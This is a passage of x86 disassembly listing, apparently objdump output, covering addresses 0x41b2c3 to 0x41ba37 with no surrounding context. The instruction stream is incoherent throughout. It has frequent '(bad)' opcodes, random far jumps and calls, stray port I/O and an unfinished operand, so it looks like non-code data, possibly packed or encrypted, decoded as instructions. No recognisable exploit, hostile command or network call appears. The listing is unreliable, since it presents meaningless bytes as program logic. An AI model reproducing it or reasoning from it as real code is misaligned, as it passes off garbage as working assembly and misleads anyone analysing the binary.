  41b2c3:	lds    eax,FWORD PTR [esp+edx*1]
  41b2c6:	mov    dh,BYTE PTR [ebp-0x66]
  41b2c9:	std    
  41b2ca:	(bad)  
  41b2cb:	jae    0x41b312
  41b2cd:	scas   al,BYTE PTR es:[edi]
  41b2ce:	sub    al,0x7d
  41b2d0:	je     0x41b32f
  41b2d2:	jg     0x41b2c8
  41b2d4:	sbb    BYTE PTR [esi],0xae
  41b2d7:	mov    eax,eax
  41b2d9:	pop    ds
  41b2da:	pop    ecx
  41b2db:	stc    
  41b2dc:	push   esi
  41b2dd:	mov    bh,0x30
  41b2df:	pop    ss
  41b2e0:	pop    ecx
  41b2e1:	add    dh,BYTE PTR [ecx-0xa]
  41b2e4:	jmp    0x41b2af
  41b2e6:	popa   
  41b2e7:	out    dx,al
  41b2e8:	std    
  41b2e9:	(bad)  
  41b2eb:	dec    ebp
  41b2ec:	out    dx,eax
  41b2ed:	(bad)  
  41b2ee:	int    0xdb
  41b2f0:	adc    eax,DWORD PTR [ebp-0x45]
  41b2f3:	out    dx,al
  41b2f4:	mov    ds:0x7ae9286c,al
  41b2f9:	push   ebx
  41b2fa:	cld    
  41b2fb:	nop
  41b2fc:	pop    edi
  41b2fd:	and    BYTE PTR [edi],cl
  41b2ff:	mov    al,0x71
  41b301:	popa   
  41b302:	retf   0x2c21
  41b305:	sub    BYTE PTR [edx+0x1132fbb1],bh
  41b30b:	test   ch,cl
  41b30d:	jbe    0x41b2d4
  41b30f:	(bad)  
  41b310:	xor    al,BYTE PTR [edi]
  41b312:	popf   
  41b313:	aad    0x93
  41b315:	jecxz  0x41b313
  41b317:	dec    esp
  41b318:	xor    eax,0x6cd9ce9c
  41b31d:	jns    0x41b2e6
  41b31f:	or     DWORD PTR [ecx-0x3d98fc32],ebp
  41b325:	inc    ebx
  41b326:	jo     0x41b389
  41b328:	fst    st(3)
  41b32a:	pop    eax
  41b32b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b32c:	loopne 0x41b2ce
  41b32e:	leave  
  41b32f:	jmp    0xb60c9eb8
  41b334:	push   ebp
  41b335:	adc    al,0x83
  41b337:	call   DWORD PTR [esi+0x15a7df58]
  41b33d:	xlat   BYTE PTR ds:[ebx]
  41b33e:	xor    al,0xb3
  41b340:	xchg   esp,eax
  41b341:	mov    esp,0xc8c2c67e
  41b346:	rcl    DWORD PTR [ecx+esi*8],1
  41b349:	mov    bl,0xe3
  41b34b:	xchg   esi,eax
  41b34c:	mov    fs,WORD PTR [esi+eiz*2+0x66c2abc1]
  41b353:	push   ebx
  41b354:	and    al,ah
  41b356:	dec    esp
  41b357:	lahf   
  41b358:	es inc ax
  41b35b:	nop
  41b35c:	ins    BYTE PTR es:[edi],dx
  41b35d:	and    DWORD PTR [ebx+0x3c],ebx
  41b360:	ret    0x6275
  41b363:	mov    edx,DWORD PTR [ecx+edx*1-0x1478df1e]
  41b36a:	mov    ds:0x7cb48a58,al
  41b36f:	mov    BYTE PTR [edi+0x2100c8e3],ch
  41b375:	pop    eax
  41b376:	aaa    
  41b377:	ds jle 0x41b3e6
  41b37a:	and    dh,BYTE PTR [edx+0x13e9858d]
  41b380:	sbb    edi,esi
  41b382:	(bad)  
  41b383:	xor    edi,DWORD PTR [eax]
  41b385:	and    ecx,DWORD PTR [edi-0x7b097d25]
  41b38b:	push   eax
  41b38c:	scas   al,BYTE PTR es:[edi]
  41b38d:	pop    esp
  41b38e:	add    DWORD PTR [ecx-0x50ff36fe],esp
  41b394:	or     eax,0x4e
  41b397:	pushf  
  41b398:	lea    eax,[edx-0x5d99454d]
  41b39e:	jle    0x41b3ba
  41b3a0:	lock popf 
  41b3a2:	mov    fs,ecx
  41b3a4:	nop
  41b3a5:	lea    edx,[edx]
  41b3a7:	sbb    DWORD PTR [ebx+0x49532927],esp
  41b3ad:	pop    ebp
  41b3ae:	dec    ebp
  41b3af:	popf   
  41b3b0:	cmc    
  41b3b1:	push   es
  41b3b2:	cmp    esi,DWORD PTR [edx+ebx*1-0xb6ecf0e]
  41b3b9:	push   ss
  41b3ba:	and    bl,dh
  41b3bc:	aas    
  41b3bd:	in     eax,0xfe
  41b3bf:	out    0x75,eax
  41b3c1:	sub    BYTE PTR [ebp+0x9],cl
  41b3c4:	stos   BYTE PTR es:[edi],al
  41b3c5:	and    al,BYTE PTR [ebp+0x74]
  41b3c8:	xor    BYTE PTR [esi],al
  41b3ca:	ss ds xlat BYTE PTR fs:[ebx]
  41b3ce:	aad    0x7f
  41b3d0:	mov    esp,0x7f8a4edb
  41b3d5:	push   eax
  41b3d6:	stos   DWORD PTR es:[edi],eax
  41b3d7:	push   es
  41b3d8:	sub    eax,0x14ae0879
  41b3dd:	mov    ds:0xe9361a02,al
  41b3e2:	mov    al,ds:0xb1e7e90d
  41b3e7:	xchg   edi,eax
  41b3e8:	cld    
  41b3e9:	mov    bl,0x24
  41b3eb:	shr    DWORD PTR ds:0x89f7f9f4,0xe5
  41b3f2:	push   eax
  41b3f4:	pop    esp
  41b3f5:	add    BYTE PTR [edx-0x2d],ah
  41b3f8:	cmp    eax,edi
  41b3fa:	xlat   BYTE PTR ds:[ebx]
  41b3fb:	in     al,dx
  41b3fc:	adc    esi,esp
  41b3fe:	xchg   DWORD PTR [edx],edi
  41b400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b401:	inc    edx
  41b402:	arpl   WORD PTR [ecx],di
  41b404:	les    ecx,FWORD PTR [edx]
  41b406:	dec    ebx
  41b407:	add    bl,0x30
  41b40a:	or     esp,edx
  41b40c:	iret   
  41b40d:	fs mov ah,0x64
  41b410:	or     al,0xd4
  41b412:	pop    ebp
  41b413:	aas    
  41b414:	sbb    al,0x21
  41b416:	dec    ecx
  41b417:	out    0xa,al
  41b419:	rcr    ah,0xd
  41b41c:	pop    edx
  41b41d:	fcomp  QWORD PTR [ebx-0xe02ff2b]
  41b423:	jmp    0x41b3b9
  41b425:	or     ecx,DWORD PTR [edi+0xae32393]
  41b42b:	mov    dl,0x7c
  41b42d:	cmp    esi,DWORD PTR [eax+0x6077b9ee]
  41b433:	retf   0x797e
  41b436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b437:	mov    dh,0x8c
  41b439:	mov    esp,0x444cac0f
  41b43e:	sbb    esp,ecx
  41b440:	cmc    
  41b441:	test   eax,0x232b26cc
  41b446:	cmp    cl,bl
  41b448:	xor    eax,DWORD PTR [eax]
  41b44a:	push   esi
  41b44b:	shr    DWORD PTR [edx+0x58],cl
  41b44e:	xlat   BYTE PTR ds:[ebx]
  41b44f:	mov    eax,ds:0xcff370c7
  41b454:	inc    ebp
  41b455:	and    edi,eax
  41b457:	inc    ebp
  41b458:	js     0x41b4c9
  41b45a:	mov    edi,0xfcd7a5a6
  41b45f:	arpl   WORD PTR [esi],ax
  41b461:	mov    edi,0xff242a2a
  41b466:	popa   
  41b467:	in     eax,0x43
  41b469:	sub    BYTE PTR [ebx],dh
  41b46b:	loope  0x41b4bc
  41b46d:	jp     0x41b3f1
  41b46f:	sbb    DWORD PTR [edi-0x59422ce4],ebx
  41b475:	sub    eax,0x3d71c457
  41b47a:	xor    al,0x91
  41b47c:	es xchg ecx,eax
  41b47e:	and    ecx,ebx
  41b480:	in     al,0x40
  41b482:	and    BYTE PTR [ebp-0x40],al
  41b485:	test   DWORD PTR [ebx+0x32],ebx
  41b488:	xlat   BYTE PTR ds:[bx]
  41b48a:	xchg   esp,eax
  41b48b:	inc    esp
  41b48c:	popa   
  41b48d:	les    edi,FWORD PTR [ebp+edx*8-0x3f681a0a]
  41b494:	fsubr  QWORD PTR [ebx-0x2c]
  41b497:	loopne 0x41b43f
  41b499:	mov    edi,0x1c543aa
  41b49e:	dec    esi
  41b49f:	jne    0x41b45b
  41b4a1:	popf   
  41b4a2:	test   BYTE PTR [edi-0x2a6f0656],ch
  41b4a8:	add    BYTE PTR [eax],dh
  41b4aa:	(bad)  
  41b4ab:	mov    ecx,DWORD PTR [ebx]
  41b4ad:	inc    di
  41b4af:	mov    ds:0xb449dd64,eax
  41b4b4:	mov    esp,0x104020ea
  41b4b9:	inc    ecx
  41b4ba:	sub    BYTE PTR [esi],0xd
  41b4bd:	(bad)  
  41b4be:	mov    eax,0x4339a4c0
  41b4c3:	jno    0x41b4ba
  41b4c5:	xchg   esp,eax
  41b4c6:	cmp    al,0xc7
  41b4c8:	cmp    BYTE PTR [ebx-0x22],bh
  41b4cb:	jge    0x41b534
  41b4cd:	mov    al,ds:0xb8613c58
  41b4d2:	xlat   BYTE PTR ds:[ebx]
  41b4d3:	lods   al,BYTE PTR ds:[esi]
  41b4d4:	add    eax,0xdb8fbed1
  41b4d9:	fisttp QWORD PTR [esi-0x1a]
  41b4dc:	je     0x41b4cf
  41b4de:	pop    esi
  41b4df:	aad    0xb9
  41b4e1:	push   esp
  41b4e2:	adc    esi,edx
  41b4e4:	mov    esi,0x2f4121bd
  41b4e9:	hlt    
  41b4ea:	jle    0x41b50b
  41b4ec:	dec    ebp
  41b4ed:	scas   eax,DWORD PTR es:[edi]
  41b4ee:	ret    0x127f
  41b4f1:	test   al,0xe8
  41b4f3:	push   edi
  41b4f4:	cmp    ah,bl
  41b4f6:	fs fcom QWORD PTR cs:[edi]
  41b4fa:	call   0xe1b14c89
  41b4ff:	sti    
  41b500:	and    al,0x4f
  41b502:	in     eax,0x22
  41b504:	gs add al,0xfa
  41b507:	enter  0xe92f,0x36
  41b50b:	test   BYTE PTR [eax+edi*1+0x655089a8],dl
  41b512:	pop    ds
  41b513:	pop    ecx
  41b514:	icebp  
  41b515:	sbb    dh,dl
  41b517:	sub    al,0x8
  41b519:	push   esi
  41b51a:	xchg   edx,eax
  41b51b:	push   cs
  41b51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b51d:	in     eax,0x2b
  41b51f:	rcl    ebp,0x99
  41b522:	adc    al,0xf2
  41b524:	jmp    0x41b53d
  41b526:	pusha  
  41b527:	xor    al,0xd
  41b529:	add    eax,0xcc41c3c2
  41b52e:	xchg   edx,eax
  41b52f:	push   edi
  41b530:	cdq    
  41b531:	jecxz  0x41b4c7
  41b533:	sbb    al,0xf2
  41b535:	xor    eax,0x608933f7
  41b53a:	(bad)  
  41b53b:	xchg   esp,eax
  41b53c:	sahf   
  41b53d:	cmp    al,BYTE PTR [esi]
  41b53f:	ins    DWORD PTR es:[edi],dx
  41b540:	jg     0x41b50e
  41b542:	push   edx
  41b543:	inc    eax
  41b544:	push   edi
  41b545:	aaa    
  41b546:	mov    dl,0x1f
  41b548:	imul   esi,DWORD PTR [ebx+0x7368a52a],0x62
  41b54f:	xor    eax,0xd528ba0e
  41b554:	not    DWORD PTR ds:0x31694931
  41b55a:	xor    cl,BYTE PTR [esi+eiz*2+0x2fdae70e]
  41b561:	and    al,BYTE PTR [ebx]
  41b563:	xchg   edi,eax
  41b564:	adc    DWORD PTR [ecx-0x6312a99b],0x8ceb85b9
  41b56e:	mov    bh,0xa6
  41b570:	mov    edx,DWORD PTR [edx]
  41b572:	loope  0x41b558
  41b574:	stos   DWORD PTR es:[edi],eax
  41b575:	cmp    eax,0xf0bcc04d
  41b57a:	shl    eax,1
  41b57c:	xchg   DWORD PTR [edi+eiz*4+0x68771650],esp
  41b583:	jne    0x41b590
  41b585:	sub    BYTE PTR [edi],dl
  41b587:	xor    esi,DWORD PTR [edx-0x7213c5c8]
  41b58d:	mov    bh,0x8
  41b58f:	fld    QWORD PTR ds:0xfca4162c
  41b595:	or     ebx,DWORD PTR [ebp+0x1f]
  41b598:	mov    al,0x7b
  41b59a:	ds inc edx
  41b59c:	ret    
  41b59d:	jo     0x41b532
  41b59f:	add    BYTE PTR [ebx-0x7],0x52
  41b5a3:	aad    0x27
  41b5a5:	enter  0xce2d,0x39
  41b5a9:	push   ds
  41b5aa:	repnz sahf 
  41b5ac:	repz leave 
  41b5ae:	ss cli 
  41b5b0:	adc    dl,BYTE PTR [ecx]
  41b5b2:	in     al,0x75
  41b5b4:	or     BYTE PTR [ecx],0xfa
  41b5b7:	and    al,0xc6
  41b5b9:	clc    
  41b5ba:	mov    edi,ds
  41b5bc:	mov    gs,ecx
  41b5be:	je     0x41b5f4
  41b5c0:	adc    DWORD PTR [eax],esi
  41b5c2:	jmp    0x41b592
  41b5c4:	xlat   BYTE PTR ds:[ebx]
  41b5c5:	cmp    BYTE PTR [ecx-0x7f],0xec
  41b5c9:	mov    ebp,0xc1550dac
  41b5ce:	out    dx,eax
  41b5cf:	jns    0x41b5bf
  41b5d1:	or     DWORD PTR [esi],ecx
  41b5d3:	ret    
  41b5d4:	lock adc ebp,ebx
  41b5d7:	pop    es
  41b5d8:	lock fdivrp st(5),st
  41b5db:	mov    ss,WORD PTR [edi]
  41b5dd:	outs   dx,BYTE PTR ds:[esi]
  41b5de:	test   DWORD PTR [ecx+0x7a],edx
  41b5e1:	fidiv  WORD PTR [ebp+ebp*4-0x64]
  41b5e5:	fldl2t 
  41b5e7:	int    0xe6
  41b5e9:	std    
  41b5ea:	outs   dx,BYTE PTR ds:[esi]
  41b5eb:	aaa    
  41b5ec:	or     DWORD PTR [ecx],0x49937f67
  41b5f2:	sub    eax,0xde0684b2
  41b5f7:	fnsave [ecx+0x3cc4eac7]
  41b5fd:	int    0x65
  41b5ff:	xchg   ecx,eax
  41b600:	pop    esp
  41b601:	shr    bl,0x55
  41b604:	xchg   edi,eax
  41b605:	jl     0x41b65c
  41b607:	outs   dx,DWORD PTR ds:[esi]
  41b608:	xchg   ecx,eax
  41b609:	das    
  41b60a:	pop    esp
  41b60b:	sub    eax,0x3ac9b37a
  41b610:	xchg   ecx,eax
  41b611:	add    ecx,edx
  41b613:	push   edx
  41b614:	pop    ds
  41b615:	lds    ebx,FWORD PTR [eax-0x3f]
  41b618:	sbb    dl,BYTE PTR [esi]
  41b61a:	mov    ebp,0xadeea3b2
  41b61f:	sbb    BYTE PTR [eax],0x8c
  41b622:	or     dh,BYTE PTR ds:0x817eba31
  41b628:	inc    esi
  41b629:	ja     0x41b6a7
  41b62b:	xchg   ecx,eax
  41b62c:	pop    esp
  41b62d:	adc    al,0xf1
  41b62f:	add    eax,0x8cc1dea6
  41b634:	ins    BYTE PTR es:[edi],dx
  41b635:	jl     0x41b69a
  41b637:	mov    WORD PTR [edi],?
  41b639:	icebp  
  41b63a:	pop    edi
  41b63b:	jmp    0x41b693
  41b63d:	push   0xffffffcf
  41b63f:	ds jo  0x41b6a0
  41b642:	push   0xffffffd8
  41b644:	mov    BYTE PTR [edx+0x65],dh
  41b647:	sub    DWORD PTR [edx-0x53],0x93f275b7
  41b64e:	int3   
  41b64f:	jmp    0x22a3:0xa70fd65a
  41b656:	cmp    dl,bh
  41b658:	add    al,0xf8
  41b65a:	push   esi
  41b65b:	sub    al,0xe0
  41b65d:	pop    ss
  41b65e:	aas    
  41b65f:	std    
  41b660:	loop   0x41b689
  41b662:	shr    DWORD PTR [ebx+0x36],0x8e
  41b666:	mov    bl,0xed
  41b668:	scas   eax,DWORD PTR es:[edi]
  41b669:	sahf   
  41b66a:	(bad)  
  41b66b:	fs repz out 0x42,al
  41b66f:	sahf   
  41b670:	jmp    FWORD PTR [eax+0x27]
  41b673:	adc    esp,edx
  41b675:	sti    
  41b676:	xchg   esp,eax
  41b677:	(bad)  
  41b678:	pop    edx
  41b679:	mov    ah,0x72
  41b67b:	adc    BYTE PTR [ebx-0x34],0xa4
  41b67f:	je     0x41b668
  41b681:	into   
  41b682:	test   al,0x23
  41b684:	dec    BYTE PTR [ebx]
  41b686:	hlt    
  41b687:	inc    edx
  41b688:	mov    esp,0x2b2462c9
  41b68d:	xor    eax,0xdf1fdfa0
  41b692:	xchg   ebp,eax
  41b693:	jno    0x41b62e
  41b695:	sbb    ecx,DWORD PTR [esi]
  41b697:	add    eax,0xb4608a16
  41b69c:	test   eax,0xa3c8cca1
  41b6a1:	mov    dh,0xae
  41b6a3:	aam    0x8c
  41b6a5:	sub    DWORD PTR [esi+0x72c9649a],ecx
  41b6ab:	push   esi
  41b6ac:	out    0xaf,eax
  41b6ae:	jmp    0x33e1:0x2e1f63f9
  41b6b5:	mov    esp,0x5bb65f99
  41b6ba:	jg     0x41b690
  41b6bc:	jge    0x41b6a7
  41b6be:	loope  0x41b650
  41b6c0:	in     al,0x49
  41b6c2:	sbb    eax,0x39455d84
  41b6c7:	xchg   ebx,eax
  41b6c8:	aaa    
  41b6c9:	loop   0x41b71d
  41b6cb:	popf   
  41b6cc:	mov    eax,ds:0x766eeb6e
  41b6d1:	jl     0x41b709
  41b6d3:	pop    ebx
  41b6d4:	outs   dx,DWORD PTR ds:[esi]
  41b6d5:	in     al,0x7e
  41b6d7:	fisubr WORD PTR [eax+eax*2-0x62ca7dcd]
  41b6de:	mov    ecx,0x85cdd678
  41b6e3:	push   ecx
  41b6e4:	pop    ss
  41b6e5:	test   BYTE PTR [eax+0x29],bh
  41b6e8:	lods   eax,DWORD PTR ds:[esi]
  41b6e9:	and    DWORD PTR [esi],esi
  41b6eb:	cmp    dh,BYTE PTR [ebx+0x60]
  41b6ee:	mov    DWORD PTR [ebx+0x16],ecx
  41b6f1:	in     eax,dx
  41b6f2:	sbb    ebx,DWORD PTR [esi-0x735cec08]
  41b6f8:	mov    edx,0x5749cf0d
  41b6fd:	out    dx,al
  41b6fe:	frstor [esi-0x19]
  41b701:	sub    eax,ebp
  41b703:	aaa    
  41b704:	sub    eax,0xb155ca91
  41b709:	push   edi
  41b70a:	push   es
  41b70b:	out    dx,eax
  41b70c:	sahf   
  41b70d:	mov    esi,0x35d7390a
  41b712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b713:	(bad)  
  41b714:	dec    ebp
  41b715:	pop    ebx
  41b716:	imul   esi,esp,0x6218d3f1
  41b71c:	addr16 test ecx,0xba41c5a3
  41b723:	push   ebx
  41b724:	dec    eax
  41b725:	daa    
  41b726:	adc    DWORD PTR [ebx+ecx*8+0x65],esi
  41b72a:	or     esp,DWORD PTR [eax-0xf559e82]
  41b730:	in     al,dx
  41b731:	es sbb al,0xba
  41b734:	inc    esp
  41b735:	mov    ecx,0x3dfb3fb9
  41b73a:	fwait
  41b73b:	lods   al,BYTE PTR ds:[esi]
  41b73c:	lods   al,BYTE PTR ds:[esi]
  41b73d:	(bad)  
  41b73e:	ds dec ecx
  41b740:	(bad)  
  41b741:	inc    edx
  41b742:	aam    0xb
  41b744:	aad    0x8a
  41b746:	cs pop ecx
  41b748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b749:	test   eax,0xa6e82a65
  41b74e:	xor    al,0xf1
  41b750:	rep outs dx,BYTE PTR ds:[esi]
  41b753:	in     al,0x70
  41b755:	out    0x78,al
  41b757:	xchg   edi,eax
  41b758:	shr    BYTE PTR [ebp-0x20f5d7e3],1
  41b75e:	xchg   esp,eax
  41b75f:	and    al,0x86
  41b761:	cmp    eax,ebx
  41b763:	andps  xmm2,XMMWORD PTR [edx]
  41b766:	push   ds
  41b767:	(bad)  
  41b768:	lock fldenv [ebx+edi*1+0x6fd9f9c8]
  41b770:	ins    BYTE PTR es:[edi],dx
  41b771:	call   0x2630:0x13b03420
  41b778:	push   es
  41b779:	sub    al,0x6b
  41b77b:	nop
  41b77c:	les    edx,FWORD PTR [ebp+0x71]
  41b77f:	cs das 
  41b781:	shl    bh,cl
  41b783:	popf   
  41b784:	jae    0x41b7df
  41b786:	ins    DWORD PTR es:[edi],dx
  41b787:	inc    esi
  41b788:	stc    
  41b789:	sub    al,0x8e
  41b78b:	mov    cl,BYTE PTR [edi]
  41b78d:	ss std 
  41b78f:	dec    esp
  41b790:	(bad)  
  41b791:	jae    0x41b7aa
  41b793:	cli    
  41b794:	add    ah,BYTE PTR [ebx+0x6c]
  41b797:	fwait
  41b798:	inc    ebp
  41b799:	pop    esi
  41b79a:	sub    eax,0x35923f18
  41b79f:	test   DWORD PTR [edx-0x63],edi
  41b7a2:	fimul  WORD PTR [ecx]
  41b7a4:	dec    DWORD PTR [edx+0x38]
  41b7a7:	mov    ebx,0x73a971e2
  41b7ac:	mov    WORD PTR [eax+0x142269d1],fs
  41b7b2:	xor    DWORD PTR ds:[ecx],0xffffff87
  41b7b6:	mov    ah,0xc2
  41b7b8:	call   0xaa27713e
  41b7bd:	xor    DWORD PTR [eax],edi
  41b7bf:	test   eax,0x823c032f
  41b7c4:	pusha  
  41b7c5:	pop    edi
  41b7c6:	fdiv   QWORD PTR [esi-0x12]
  41b7c9:	cmp    DWORD PTR [ecx-0x359f8634],esp
  41b7cf:	fcomp  QWORD PTR [edx-0x79204e12]
  41b7d6:	pop    es
  41b7d7:	adc    ebp,DWORD PTR [edx]
  41b7d9:	ret    0xb06
  41b7dc:	pop    esp
  41b7dd:	ss xchg ch,bh
  41b7e0:	fcom   DWORD PTR [eax+0x5c2a2f27]
  41b7e6:	(bad)  
  41b7e7:	fnstenv [ecx-0x5d]
  41b7ea:	mov    edx,0xf182e919
  41b7ef:	cli    
  41b7f0:	les    ebp,FWORD PTR [ecx+0x21]
  41b7f3:	mov    al,0xa
  41b7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7f6:	inc    edx
  41b7f7:	sar    DWORD PTR [eax+0x28e8b312],0xbb
  41b7fe:	lock iret 
  41b800:	sbb    BYTE PTR [ebp-0x50],dh
  41b803:	or     al,0x2e
  41b805:	dec    esi
  41b806:	addr16 pop eax
  41b808:	xor    edi,DWORD PTR ds:0x6f2cbf4a
  41b80e:	sub    bl,BYTE PTR [edi+0x56]
  41b811:	add    dh,BYTE PTR [edx-0x5e]
  41b814:	add    eax,0x82c55777
  41b819:	inc    ecx
  41b81a:	into   
  41b81b:	out    dx,eax
  41b81c:	sbb    eax,0x87c387c4
  41b821:	int    0xd5
  41b823:	std    
  41b824:	mov    ds:0xfe4eda0,al
  41b829:	add    al,0xed
  41b82b:	ja     0x41b80b
  41b82d:	scas   al,BYTE PTR es:[edi]
  41b82e:	ja     0x41b810
  41b830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b831:	lds    eax,FWORD PTR [ebx+eiz*4-0x7e]
  41b835:	cmp    DWORD PTR ds:0x4adccd0e,0xffffffff
  41b83c:	inc    edi
  41b83d:	rol    DWORD PTR [edi+0x12693ad],1
  41b843:	push   0x941e70ec
  41b848:	inc    edi
  41b849:	gs pop eax
  41b84b:	lods   al,BYTE PTR ds:[esi]
  41b84c:	hlt    
  41b84d:	push   0x63
  41b84f:	jb     0x41b858
  41b851:	mov    dh,bl
  41b853:	or     eax,0x48834b3e
  41b858:	mov    ds:0xa1a29518,eax
  41b85d:	shl    DWORD PTR [ebp+0x231e0cdd],1
  41b863:	neg    ebp
  41b865:	fdivr  DWORD PTR [edi-0x48ffde7b]
  41b86b:	gs pop ecx
  41b86d:	les    edi,FWORD PTR [edi-0x57]
  41b870:	xor    BYTE PTR ds:0xe5d2e933,0x99
  41b877:	jae    0x41b8e9
  41b879:	ds mov bl,0x84
  41b87c:	or     bh,BYTE PTR [edx+eiz*8+0x1dec6afc]
  41b883:	ss and eax,0xb7be0de8
  41b889:	stos   BYTE PTR es:[edi],al
  41b88a:	sub    eax,0x12d9e81a
  41b88f:	add    DWORD PTR ds:0xd72c5e58,ecx
  41b895:	nop
  41b896:	mov    ds:0xbcbcd4fe,al
  41b89b:	jb     0x41b830
  41b89d:	mov    edx,0x451b7d27
  41b8a2:	sub    eax,0x9f6bfab2
  41b8a7:	lea    eax,[esi]
  41b8a9:	mov    DWORD PTR [edx-0x4d4673be],esi
  41b8af:	aas    
  41b8b0:	not    BYTE PTR [eax-0x4d]
  41b8b3:	lds    esp,FWORD PTR [eax]
  41b8b5:	retf   
  41b8b6:	fimul  WORD PTR [esp+esi*1+0x5c]
  41b8ba:	sub    ah,BYTE PTR [edx]
  41b8bc:	pop    edi
  41b8bd:	push   edi
  41b8be:	jmp    0x1c61:0xc51bdb11
  41b8c5:	dec    esp
  41b8c6:	lahf   
  41b8c7:	mov    eax,0xbded6bf5
  41b8cc:	sub    bl,BYTE PTR [ebx-0x499a8b09]
  41b8d2:	lods   al,BYTE PTR ds:[esi]
  41b8d3:	stos   BYTE PTR es:[edi],al
  41b8d4:	jl     0x41b8e9
  41b8d6:	push   esi
  41b8d7:	xchg   esi,eax
  41b8d8:	repnz mov ds:0x29f30b9f,eax
  41b8de:	mov    dl,0x2
  41b8e0:	add    BYTE PTR [edx+ecx*4],al
  41b8e3:	ss push ebx
  41b8e5:	sti    
  41b8e6:	push   es
  41b8e7:	jbe    0x41b885
  41b8e9:	test   DWORD PTR [ebx-0x30],esi
  41b8ec:	ins    DWORD PTR es:[edi],dx
  41b8ed:	adc    al,0xc9
  41b8ef:	fdivr  QWORD PTR [edx+0x47]
  41b8f2:	push   esi
  41b8f3:	mov    ebx,0x2dfbb7b7
  41b8f8:	out    0xdf,eax
  41b8fa:	ror    ecx,0x3d
  41b8fd:	jb     0x41b8af
  41b8ff:	ss sti 
  41b901:	pushf  
  41b902:	push   edx
  41b903:	and    BYTE PTR [eax-0x3831b9dd],al
  41b909:	stos   BYTE PTR es:[edi],al
  41b90a:	daa    
  41b90b:	push   esp
  41b90c:	push   edi
  41b90d:	and    BYTE PTR [esi-0x75],dl
  41b910:	and    al,ch
  41b912:	ins    BYTE PTR es:[edi],dx
  41b913:	pop    ds
  41b914:	out    0xdf,al
  41b916:	retf   
  41b917:	sbb    esp,ebx
  41b919:	(bad)  
  41b91a:	mov    ch,0x36
  41b91c:	aad    0x8a
  41b91e:	test   cl,0x9f
  41b921:	cwde   
  41b922:	pop    esp
  41b923:	pop    esi
  41b924:	and    ecx,0xffffffb2
  41b927:	add    ebx,edi
  41b929:	pop    esp
  41b92a:	fcmovb st,st(6)
  41b92c:	sbb    dl,BYTE PTR [eax-0x13fd740c]
  41b932:	jmp    0x695a5ed9
  41b937:	call   0x78b03088
  41b93c:	mov    esp,0x78133d4f
  41b941:	mov    WORD PTR [ecx-0x60],ds
  41b944:	add    ecx,DWORD PTR [ebx]
  41b946:	add    esp,DWORD PTR [ebx+0x5477e29a]
  41b94c:	shl    DWORD PTR [eax-0xb407a94],1
  41b952:	mov    esp,0xbb39f046
  41b957:	and    bh,ch
  41b959:	push   0xebef62de
  41b95e:	cdq    
  41b95f:	jmp    0x935b:0x6126617
  41b966:	aas    
  41b967:	fdiv   DWORD PTR [esi]
  41b969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b96a:	xor    ah,BYTE PTR [edi]
  41b96c:	shl    BYTE PTR [eax],0x52
  41b96f:	cmp    al,BYTE PTR [ecx+0x43]
  41b972:	mov    ah,0x4
  41b974:	shl    WORD PTR [ecx],cl
  41b977:	scas   al,BYTE PTR es:[edi]
  41b978:	icebp  
  41b979:	sbb    DWORD PTR [eax-0xf],0x3b09b6bd
  41b980:	dec    esi
  41b981:	sub    DWORD PTR [esp+ebp*1-0x125ccf4e],eax
  41b988:	stc    
  41b989:	scas   al,BYTE PTR es:[edi]
  41b98a:	jns    0x41b951
  41b98c:	jne    0x41b940
  41b98e:	jbe    0x41b9ce
  41b990:	or     eax,0xab2b860a
  41b995:	shl    BYTE PTR [eax],1
  41b997:	xchg   dl,bl
  41b999:	push   eax
  41b99a:	rcr    BYTE PTR [eax+eiz*4+0x5c122b30],1
  41b9a1:	aad    0x50
  41b9a3:	or     ebx,ecx
  41b9a5:	mov    ecx,0x63047b24
  41b9aa:	push   esp
  41b9ab:	sub    al,0x23
  41b9ae:	pop    ds
  41b9af:	adc    ah,BYTE PTR [edx-0x45]
  41b9b2:	push   esp
  41b9b3:	xor    BYTE PTR [esi],ah
  41b9b5:	cld    
  41b9b6:	push   es
  41b9b7:	mov    eax,DWORD PTR [eax+edx*8-0x5ec80dac]
  41b9be:	mov    eax,0x6a4905f1
  41b9c3:	xor    al,0xd0
  41b9c5:	sti    
  41b9c6:	cs leave 
  41b9c8:	in     al,0x5
  41b9ca:	push   0xb2647e91
  41b9cf:	pop    ds
  41b9d0:	outs   dx,BYTE PTR ds:[esi]
  41b9d1:	sbb    cl,BYTE PTR [ecx-0x7ad74f53]
  41b9d7:	fild   DWORD PTR [ecx+0x1f3656a6]
  41b9dd:	or     BYTE PTR [edi],dh
  41b9df:	out    dx,al
  41b9e0:	xchg   BYTE PTR [eax+0x3d],cl
  41b9e3:	sbb    DWORD PTR [edi-0x22],eax
  41b9e6:	icebp  
  41b9e7:	pop    ebx
  41b9e8:	mov    dh,0x3a
  41b9ea:	dec    esp
  41b9eb:	sbb    eax,0x80083ddf
  41b9f0:	leave  
  41b9f1:	xchg   BYTE PTR [ebp-0x5220ab3f],bl
  41b9f7:	(bad)  
  41b9f9:	(bad)  
  41b9fa:	(bad)  
  41b9fb:	idiv   DWORD PTR [ebx+0x79]
  41b9fe:	mov    eax,0x6da7a145
  41ba03:	ret    0x317d
  41ba06:	outs   dx,DWORD PTR ds:[esi]
  41ba07:	push   edi
  41ba08:	inc    esp
  41ba09:	cmp    eax,0x797ca879
  41ba0e:	in     al,dx
  41ba0f:	loope  0x41ba5e
  41ba11:	adc    al,0x3f
  41ba13:	sbb    al,cl
  41ba15:	and    al,0xad
  41ba17:	les    esp,FWORD PTR [edx-0x58e3330a]
  41ba1d:	call   0xcf4c:0x4c4c6ec8
  41ba24:	call   0xb656:0xc4cdbc58
  41ba2b:	or     al,0x26
  41ba2d:	mov    edx,DWORD PTR [ebx]
  41ba2f:	not    DWORD PTR [esi+0x59]
  41ba32:	outs   dx,BYTE PTR ds:[esi]
  41ba33:	jle    0x41ba39
  41ba35:	and    ecx,edi
  41ba37:	fidiv  DWORD PTR [edi+0x6ccf691]
